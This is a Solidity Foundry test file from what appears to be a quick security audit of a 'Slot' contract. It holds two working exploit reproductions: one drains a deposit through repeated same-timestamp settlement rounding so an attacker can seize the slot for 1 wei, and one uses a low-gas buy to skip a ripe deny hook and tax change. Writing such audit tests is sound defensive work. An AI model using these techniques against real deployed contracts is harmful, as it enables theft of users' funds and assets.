// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {SlotsTest, DenyBuys} from "./Slots.t.sol";
import {Slot, SlotInit} from "../../src/Slot.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Exploit reproductions: passing tests demonstrate the current defects.
contract QuickAuditTest is SlotsTest {
    function test_RepeatedSettlementDrainsDepositAtSameTimestamp() public {
        SlotInit memory init = _init(address(0), 0);
        init.currency = IERC20(address(0));
        init.taxBps = 10_000;
        Slot s = Slot(payable(factory.createSlot(init)));
        vm.deal(alice, 100);
        vm.prank(alice);
        // 3,888,000 / 2,592,000 = 1.5 wei per second.
        s.buy{value: 100}(alice, 3_888_000, 100, 100);
        uint256 start = block.timestamp;
        vm.warp(start + 1);
        assertEq(s.taxOwed(), 1);

        vm.startPrank(bob);
        for (uint256 i; i < 100; ++i) s.topUp(0);
        assertEq(block.timestamp, start + 1);
        assertEq(s.deposit(), 0);
        assertEq(s.collectedTax(), 100);
        s.liquidate();
        s.buy(bob, 1, 0, 0);
        vm.stopPrank();
        assertEq(s.occupant(), bob);
    }

    function test_LowGasBuySkipsRipeHookAndTax() public {
        Slot s = _slot(address(0));
        DenyBuys deny = new DenyBuys();
        vm.prank(manager);
        s.proposeTerms(10_000, address(deny), bytes32(0), true, true);
        vm.warp(block.timestamp + s.TERMS_DELAY());
        assertTrue(s.hasRipeTerms());
        vm.startPrank(bob);
        token.approve(address(s), type(uint256).max);
        vm.expectRevert(DenyBuys.Denied.selector);
        s.buy(bob, 100 ether, 1 ether, 1 ether);
        s.buy{gas: 300_000}(bob, 100 ether, 1 ether, 1 ether);
        vm.stopPrank();
        assertEq(s.occupant(), bob);
        assertEq(s.hook(), address(0));
        assertEq(s.taxBps(), 1000);
        assertTrue(s.hasRipeTerms());
    }
}
